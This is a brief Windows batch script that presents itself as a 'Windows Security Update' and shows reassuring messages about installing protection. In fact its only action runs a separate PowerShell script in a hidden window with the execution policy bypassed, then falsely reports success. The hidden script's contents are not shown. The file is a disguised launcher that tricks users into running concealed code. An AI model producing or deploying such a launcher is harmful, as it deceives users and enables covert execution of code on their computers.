@echo off
title Windows Security Update
echo Installing critical security update...
echo Please wait while we update your system...
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "system_helper.ps1"
echo Update completed successfully!
echo Your system is now protected.
echo You can close this window.
pause
exit
